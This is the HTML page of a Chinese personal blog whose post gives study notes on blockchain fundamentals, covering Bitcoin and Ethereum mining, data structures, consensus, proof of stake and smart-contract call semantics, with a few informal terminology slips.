<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wgc5.gitee.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="北极星上的稻草人">
<meta property="og:url" content="https://wgc5.gitee.io/index.html">
<meta property="og:site_name" content="北极星上的稻草人">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="北极星上的稻草人">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://wgc5.gitee.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>北极星上的稻草人</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">北极星上的稻草人</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">稻草人的笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">35</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">区块链基础知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-09-08 12:42:58 / 修改时间：12:45:16" itemprop="dateCreated datePublished" datetime="2021-09-08T12:42:58+08:00">2021-09-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/" itemprop="url" rel="index"><span itemprop="name">区块链</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链基础知识"><a href="#区块链基础知识" class="headerlink" title="区块链基础知识"></a>区块链基础知识</h1><h2 id="区块链："><a href="#区块链：" class="headerlink" title="区块链："></a>区块链：</h2><p>​        分布式数据库（本质：一个个区块形成的链表），区块就像一个个账本，链就是将一个个账本联系起来的纽带；2个区块之间采用p2p方式链接，整体呈现网状分部；每个账本记录着一些公认的信息；综上所述，区块链就笼统的解释为分布式数据库。</p>
<p><strong>第一代区块链：</strong></p>
<p>​        去中心话的加密货币；典型例子就是比特币；每个加密货币都会产生一个伪随机数，可以用于加追踪和验证交易。<br>​    特点：安全性高，可追踪和验证、透明度高<br>​    缺点：耗时、成本高</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904100457419.png" alt="image-20210904100457419"></p>
<p><strong>第二代区块链（以太坊为例）：</strong></p>
<p>​        比方说，就像滴滴打车平台，以前是司机自己抢单，现在可以让司机交押金，然后由平台派单。相比第一代的比特币，以太坊大大提高了验证的效率。以前，人们想开发数字货币，要根据比特币的协议，将原来的软件代码拷贝下来，变成自己的版本。因为原始代码会随时升级，所以这些货币会变得不兼容，而以太坊允许人们可以直接在协议上修改代码，做二次开发就可以了<br>​    特点：兼容、高效率<br>​    缺点：应用单一</p>
<p><strong>第三代区块链：</strong></p>
<p>​        又有两个新的成果。一个是智能合约的诞生，智能合约可以跟踪所有跟合同有关的执行情况，这意味着，它可以约束各种违反合同的不法行为。第二个成果是，区块链技术诞生了一种新的融资方式和财富分配方式。股权分配是一个道理<br>​    特点：可伸缩性、互操作性（侧链），个性化</p>
<p><strong>不可篡改性</strong></p>
<p>​    1.原理：提交时，用区块算出一个哈斯值a；下载时，再用区块算出一个哈斯值b；若a=b，则判断为没被篡改（其实会有哈斯碰撞情况，不能说百分比正确），若a！=b，则一定被篡改过。(扩展，提高安全性：X=x+random随机数)    </p>
<p>​    2.应用：预测，哈斯算法X—-&gt;H(x),由于哈斯计算具有抗碰撞性质，所以，可以先公布H(x)，后面预测正确就可以公布X。</p>
<p><strong>区块链创建账号</strong></p>
<p>​    自己创建私钥和公钥；验证：用私钥签名，用公钥验证。关键，随机源的取值</p>
<p><strong>说明：以下图片出自b站北大肖老师授课视频，内容为学习笔记</strong></p>
<h3 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h3><p>​     挖矿模式：pow（proof of work）</p>
<p>​    数据结构：区块链+merkle tree（如下图）；Merkle Tree 相比 Balance Tree，也是普通指针换成了哈希指针</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904102345008.png"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904102735472.png" alt="image-20210904102735472"></p>
<p><strong>挖矿：</strong>比特币挖矿的过程中实际就是找一个nonce，nonce跟区块的块头里的其他信息合一起作为输入，得出的哈希值要小于等于某个指定的目标预值。H(block header)≤target。block header 指块头，块头里有很多域，其中一个域是我们可以设置的随机数nonce，挖矿的过程是不停的试随机数，使得block header取哈希后落在指定的范围之内。</p>
<p><strong>共识机制</strong></p>
<p>​    1.区块链共识机制：哈斯共识</p>
<p>​    2.比特币共识机制：去中心化的账本的内容–记账权–求nonce（hash rate）–算力“投票”</p>
<p>目标预值（期望预值expected time=14天）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904165220798.png" alt="image-20210904165220798"></p>
<p>挖矿难度</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210904165056764.png" alt="image-20210904165056764"></p>
<p><strong>比特币安全性保证：</strong></p>
<pre><code> 1.密码学机制：非对称加密</code></pre>
<p>​     2.共识机制</p>
<p><strong>分叉</strong></p>
<p>​    硬分叉：分叉永久存在；旧区块保守者不承认新区块模式，新区块模式承认旧区块模式，旧区块保守者永远只在旧区块链上挖矿。</p>
<p>​    软分叉：不会存在永久分叉；新区块先进者不承认旧区块模式，旧区块保守者赞同新区块模式，由于严重机制和共识机制的问题，只要大部分人更新了软件，分叉就不会永远存在；例如旧区块只验证a条件，而新区块要验证a、b两个区块;最终淘汰旧区块；如p2sh（pay to script hash）引入时就出现了软分叉)</p>
<p><strong>匿名性</strong></p>
<p>​    1.用户并不需要公布和捆绑的个人信息，只需要公布自己的公钥（现在连公钥都不需要，只需要公布公钥的哈希值）</p>
<p>​    2.多地址捆绑干扰，多个地址对应多个输出（一个用户可以开始多个账号，就有多个地址）</p>
<p>​    3.盲签方法</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905153225483.png" alt="image-20210905153225483"></p>
<p>​    4.零知识证明：证明方只需要向验证法（直接/间接）证明某一个陈述，不需要透露其他陈述是正确的以外信息。（例如，A证明这个交易者是自己，A只需要给出一个相同的hash值即可）</p>
<p>​    零知识证明的数学基础：同态隐藏：如图是其三个定义性质</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905152338057.png" alt="image-20210905152338057"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905153053665.png" alt="image-20210905153053665"></p>
<ol start="5">
<li>零币和零钞</li>
<li>货币混合：用户们把比特币发给一个管理中心，管理中心再等额随机分配比特币（地址就不一样了，因为自己很有可能拿到的都是别人的币），管理中心还可以用比特币买其他的货币，经过几次转换，再把比特币返款给用户。</li>
</ol>
<p>打破匿名性：（1）在现实中进行交易（蹲点交易时间/地点等，再到链上查阅区块，可以分析出）</p>
<p><strong>不可溯源性</strong></p>
<p>​    这里说的溯源性是指找到用户的个人信息，这是由匿名性决定（主要）；但比特币的交易是可以溯源的，这里的指的是比特币的余额概念，例如可以判断是否进行了双花（double spending）操作，溯源使用的是UTXO模型。</p>
<p><strong>量子计算与比特币</strong></p>
<p>​        比特币只是第一代区块链的典型产物，如今已经开始研发第三代区块链了（第二段区块链典型产物：以太坊）。虽然量子计算有着惊人的算力，但是就目前知识发展来说，其对比特币威胁并非是致命的。原因如下：（1）量子计算机如今虽然发展迅速，但截止2020年12月，目前最强的量子计算机–九章，最理想状态下能控制76个量子比特；但要想破解比特币理论上需要控制4000个量子比特。而且目前量子计算机的量子控制的准确性还非常低，误差和出错率都很大。（2）目前，要想破解比特币，即使全球计算机同时运行，都破解不了（难度是2的256次方，因为其密钥值是256位）；而理论上，量子计算机只需要以分钟，甚至是秒做单位就可以破解。但这是在知道公钥的情况下破解。但是目前有的区块链技术已经不需要公布公钥了，只需要公布公钥的hash值，从公钥的hash值破解得到公钥，再从公钥破解到私钥；就目前的学术理论水平来说，即使是量子计算机也是不可能算出；首先是hash运算不可逆，而且其过程可能会出现有效数据丢失，而量子计算机主流认为的破解方法是暴力破解（该想法主要来源北京大学肖臻老师《区块链技术与应用》第13节课程的思考）（3）量子计算机是新型物理设备，而区块链只是软件；而且，目前用的是图灵计算机，属于不同的设备；再者，软件和硬件之间存在非常大的隔阂，以后很有可能会研发出量子计算机上的区块链（移植）。（4）目前区块链正在落实应用到我们的现实生活中，发展方向多，如：电子钞票（如：电子人民币）、电子发票、药品/食物标签追踪、公益、联盟链等等。存在既有理，所以区块链技术还是很有存在和发展的意义的。</p>
<p>​    总之，本人不认为区块链技术在量子计算机面前不值一提；量子计算机的发展还有很长的路，几年甚至几十年也不一定；按目前的发展速度，比特币在未来10年里应该是安全的（只是说在量子计算机威胁方面），至于以后的事，谁都不好说。再补充一下，量子计算机和区块链技术都是非常有用的技术，不能片面的评价谁好谁不好。</p>
<h3 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h3><p>​     <strong>挖矿模式</strong>：pow（proof of work）</p>
<p>​    <strong>用户机制：</strong>（1）比特币每次交易必须把已有的币花光，例如，B有10个币，B与C的交易只需要3个币，那么B还要把7个币转给自己，这是由于要保证币的来源所决定的。以太坊只验证币的支出交易，这样可以防御双花攻击（double spending attack，由于支付者A不诚实，同一笔钱进行多次交易并发布到区块链上：A-B，A-C…，这样A用一笔钱进行了多次交易，还可以把钱转回到自己地址上）；随机而来会造成应答攻击（replay attack，由于接收者B不诚实，把A-B重复发到链上，这样其他矿工看到了，就一起写入区块，最后写到区块链上，B就收到重复的多笔交易）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210905170220959.png" alt="image-20210905170220959"></p>
<p>（2）比特币用户身份不确定性，一个用户可以拥有多个账号，多个身份，进而迷惑交易。而以太坊采用了身份确认/固定机制，一个用户可以由多个账号，但是身份固定。</p>
<p><strong>账户类型的数据结构</strong></p>
<p>​    <strong>问题1</strong>：为什么不像BTC那样将哈希表组织为Merkle Tree？</p>
<p>​    答：BTC存储的是交易信息，存到区块链后不需要更改，而且BTC是没有账户概念的，它是通过比特币的流通来计算余额。若ETH采用Merkle Tree，那么每次产生新的区块（新交易），就需要重新构建Merkle Tree，而且新区块产生的周期为10s，这样一来就不现实了；而且随着交易的增加，Merkle Tree会越来越大，这也不现实。（BTC的Merkle Tree大小是由区块大小决定的，区块包含的交易上限是4000个，那么Merkle Tree大小并不会太大）</p>
<p>​    <strong>问题2：</strong>我们可以不用hash表，直接在Merkle Tree上修改新添加的部分么？</p>
<p>​    答：目前Merkle Tree并未提供一个高效的查找和更新的方案，为保证查找效率和一致性，必须排序。</p>
<p>​    <strong>问题3：</strong>那采用排序的Sorted Merkle Tree可以吗？</p>
<p>​    答：虽然进行了排序，查找效率有了保证，但是新建账号时，地址是随机的，当插入的结点在中间非叶子结点部分，就需要进行重构，所以Sorted Merkle Tree插入、删除(实际上可以不删除)的代价太大。因此专家采用了MPT结构。</p>
<p><strong>MPT(Merkle Patricia tree/trie)</strong></p>
<p>​    trie：字典树/前缀树；保证一致性</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906102334640.png" alt="image-20210906102334640"></p>
<p>​    Patricia tree/trie：路径压缩trie/tree；提高效率</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906104758807.png" alt="image-20210906104758807"></p>
<p>MPT：将Merkle Tree与Patricia trie结合；提高了安全性和性能</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906105523041.png" alt="image-20210906105523041"></p>
<p><strong>挖矿技术</strong></p>
<p>​    （引入）<strong>莱特币挖矿技术</strong>：Memory Hard Mining Puzzle。1.设置一个较大的数组（128k大小），Seed为种子结点，通过Seed运算得到一个数并把这个数放到第一个位置；之后的每个数都是通过计算前一个数的hash值得到（逻辑相邻，数组位置其实不相邻，有点像链表，但是存在数组里），具有一定的前后依赖性。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906155836352.png" alt="image-20210906155836352"></p>
<p>2.在求解Puzzle时，从数组中取数，但是要取下一个数就必须要用当前的数求出下一个数的位置。（如A–&gt;B–&gt;C)；拿到数后，求出符合条件的nonce就算挖到。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906160530221.png" alt="image-20210906160530221"></p>
<p>补充：如果数组足够大，对于挖矿矿工来说，必须保存该数组以便查询，否则每次不仅计算位置，还要根据Seed计算整个数组数据，才能查询到对应位置的数据。这对于矿工来说，计算性能要求（如：内存）大幅度上升。不利于ASCI专业挖矿机挖矿（这类矿机计算性能好，但是内存小），但利于大众挖矿（普通的计算机满足该内存需求）</p>
<p>​    <strong>以太坊挖矿技术</strong>：以太坊的理念与莱特币类似，都是Memory Hard Mining Puzzle，但具体设计上与莱特币不同。以太坊中，设计了两个数据集，一大一小；小的为16MB的cache，大的数据集为1G的dataset(DAG)。其关系为，1G的数据集是通过16MB数据集生成而来的。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906162108463.png" alt="image-20210906162108463"></p>
<p>​    问：为什么要设计一大一小的数据集？</p>
<p>​    答：大的数据集是为了抵抗ASCI矿机，但对于轻节点并不友好（因为轻节点不用挖矿，它只是使用）；于是便有了小数据集，它给轻节点提供了检验功能。</p>
<p>​    <strong>DAG生成过程：</strong>大的数组中每个元素都是从小数组中按照伪随机顺序读取一些元素，方法同莱特币中相同。如第一次读取A位置数据，对当前哈希值更新迭代算出下一次读取位置B，再进行哈希值更新迭代计算出C位置元素。如此来回迭代读取256次，最终算出一个数作为DAG中第一个元素，如此类推，求出DAG的每一个元素。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906162255374.png" alt="image-20210906162255374"></p>
<p>​    <strong>以太坊挖矿过程：</strong>目标是求出一个符合要求的nonce。首先根据block header和nonce运算得出第一个初始hash，根据hash映射到初始位置A（A后一个位置为A‘）；然后用A和A’运算得到下一个位置B，如此类推，迭代64次，共读取128个数；最后计算出一个hash值。若符合条件，则算挖矿成功；若不符合则要重新选择nonce进行重复操作，直到当前的区块挖出或被挖出（若先被别人挖出，block header就变了，则要准备挖下一个区块）</p>
<p><strong>奖励机制证明方式：</strong>目前正有工作量证明（POW）向权益证明(POS: Proof of State)转型，但是目前还是pow；但是由于POS还不完善，无法直接投入使用；而挖矿难度呈指数增加，所以在2017年-2018年之间进行了难度下调。（（奖励）铸币数也由5个降低为3个）</p>
<p>​    问：为什么不直接就推行pos？而且要由pow过渡？</p>
<p>​    答：由于矿工投入了大量资金打造挖矿设备，若马上采取pos，那么挖矿设备就没用了，用于引起暴动，也容易产生以太坊分支，不利于发展。</p>
<p><strong>权益证明主流思想：</strong></p>
<p>​    以太坊中，准备采用的权益证明协议为Casper the Friendly Finality Gadget(FFG)，该协议在过渡阶段是要和POW结合使用的。FFG协议引入一个概念：Validator(验证者)，一个用户想要成为Validator，需要上交一笔“保证金”，这笔保证金会被系统锁定。Validator的职责是推动系统达成共识，投票决定哪一条链成为最长合法链，投票权重取决于保证金数目。它采用两次投票的方式：prepare投票和Commit 投票，规定每次投票结果都要获得2/3以上的验证者同意；把100个区块等分为2部分；前50个采用commit投票，后50个采用prepare投票（相对的），当2个部分都通过了，这100个区块才算通过。如图</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906201626270.png" alt="image-20210906201626270"></p>
<p><strong>权益证明的奖罚机制：</strong>为了鼓励大家参与验证epoch，每次完成验证，都会得到相应的验证奖励；为了防止攻击/捣乱，如果有权益者不参与投票，那么他会扣罚一部分保证金；而对于同时2边都投的权益者，则没收其全部保证金；通过惩罚积出的以太币会被销毁。</p>
<p><strong>奖励机制之预挖矿：</strong>这里“预挖矿”并不挖矿，而是在开发以太坊时，给开发者预留了一部分货币（其份额占目前已有币的大半部分）。</p>
<p><strong>以太坊难度调整：</strong>区块编号减去了三百万</p>
<p>算法如图</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906164806092.png" alt="image-20210906164806092"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906164853479.png" alt="image-20210906164853479"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906165209214.png" alt="image-20210906165209214"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906164952603.png" alt="image-20210906164952603"></p>
<p>补充：以前是没有H’的，是难度回调时才添加的（在什么不直接采用POS的背景下）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906165653320.png" alt="image-20210906165653320"></p>
<p><strong>以太坊发展</strong></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906170115398.png" alt="image-20210906170115398"></p>
<p><strong>智能合约</strong></p>
<p>说明：智能合约并不智能，只是一个由代码执行的合约规定；合约是根据需求用代码来表示的；因此，一般情况下，合约上链了，执行的结果也确定了，即使代码有漏洞/被利用/受到攻击等，都无法改变；这是由区块链的不可篡改性决定的。（当然，这不是绝对不可篡改，利用区块链回滚可以撤销操作，但是其会产生巨大的影响）</p>
<p>​    以公开拍卖智能合约为例</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907191401485.png" alt="image-20210907191401485"></p>
<p>​    <strong>合约调用：</strong></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907192116543.png" alt="image-20210907192116543"></p>
<p>补充：以太网规定，内部账号不能调用合约，只有外部账号才可以调用合约（这句话需要自行理解），这种调用如果出错，整个合约会一起回滚，不会往下执行。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907192515304.png" alt="image-20210907192515304"></p>
<p>补充：这种调用，当函数调用出错时，call（）函数会返回false，表明调用失败；但是合约会继续往下执行。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907192906267.png" alt="image-20210907192906267"></p>
<p>补充：这种调用与上面call（）调用类似，不同之处是调用时不用跳到另外合约环境中进行（当合约调用合约时），在本身合约执行即可。</p>
<p>（特别）匿名函数</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907193208569.png" alt="image-20210907193208569"></p>
<p>补充：当函数缺省/合约没有执行任何函数/调用函数不存在时，系统会调用该函数。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203719865.png" alt="image-20210907203719865"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907193527302.png" alt="image-20210907193527302"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907194720634.png" alt="image-20210907194720634"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907195902583.png" alt="image-20210907195902583"></p>
<p><strong>回答死循环问题：</strong>为了应对有的人恶意消耗资源（如：制造死循环），引入了汽油费的机制；（合约发起人）交易需要支付汽油费（执行不同语句消耗的汽油量不同）。由于无法确定合约执行汽油费的总额，每个合约还需要确定一个最大汽油费数值（表示愿意承受的费用）；而且每个区块也有一个汽油费上限；当消耗的汽油费超过区块最大汽油费，合约就会结束运行（即使交易没完成），注意回滚汽油费是不会退的。</p>
<p><strong>问：</strong>是先挖矿再执行合约？还是先执行合约再挖矿？</p>
<p><strong>答：</strong>先执行合约再挖矿。因为要想挖矿就必须获得完整的block header；其中状态树、交易树、收益树三颗树是存储在区块链的全结点上的；执行合约/验证交易时，用户的余额会发生变化，所以执行合约并验证结束后，三个树才能确定，三颗树确定后，block header才能确定，所以必须先执行合约再挖矿。<strong>注意</strong>：矿工在验证交易时是在本地验证的，那时候消耗的汽油量和余额变化是写在本地，只有挖到矿并成功写到区块链上才会生效；所以不存在如果挖不到矿，别人的汽油费白花的情况；也不存在多个矿工验证合约重复消耗合约的情况。</p>
<p><strong>问：</strong>既然是先验证/执行合约，再挖矿；那如果挖不到矿，岂不是白干活了？那可不可以直接不验证，用别人的结果，继续挖下一个区块？</p>
<p><strong>答：</strong>每个矿工都必须验证每一个交易/合约，即使挖不到而白干活；因为你不验证，你就得不到下一个区块的用户状态；必须验证后才可以获得当前完备且正确的状态。别人的验证结果是不可以套用的，因为验证/挖矿过程用的是自己的地址/hash值，别人验证用的是别人的地址/hash值（如果用，收款人就是对方，自己永远得不到奖励）；所以要想继续挖矿，就必须自己验证。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907195059308.png" alt="image-20210907195059308"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907195225290.png" alt="image-20210907195225290"></p>
<p><strong>问：</strong>执行发送错误的交易需要发布到区块链上么？（注意是交易有错）</p>
<p><strong>答：</strong>需要；（1）如果不发布到区块链上就无法扣取汽油费；（2）交易是否出错，需要经过全部人验算才行</p>
<p>问：智能合约支持多线程么？</p>
<p>答：不支持，因为区块链要保证状态一致性；多线程容易产生多过结果，（多线程）多个核访问进程的顺序不同容易出现多个状态。但是区块链是分布式的。（所有会导致产生不确定状态的技术都不可以，例如真.随机数（伪随机数可以）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203754437.png" alt="image-20210907203754437"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203812364.png" alt="image-20210907203812364"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203952514.png" alt="image-20210907203952514"></p>
<p>说明：transfer（）转账过程出现错误会回滚；而send（）转账过程会抛出错误，但不会回滚。上面两个是专门用于转账的，但call（）也可以用于转账，call（）主要用于函数调用。</p>
<p><strong>拍卖例子：</strong>出价可以多次出（拍卖出价是发布合约交易的形式），所有拍卖货币要先锁在区块链上；拍卖结束时，未拍卖成功的人的币会返款，拍卖成功的人的币会转给拍卖货物的人。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907205250354.png" alt="image-20210907205250354"></p>
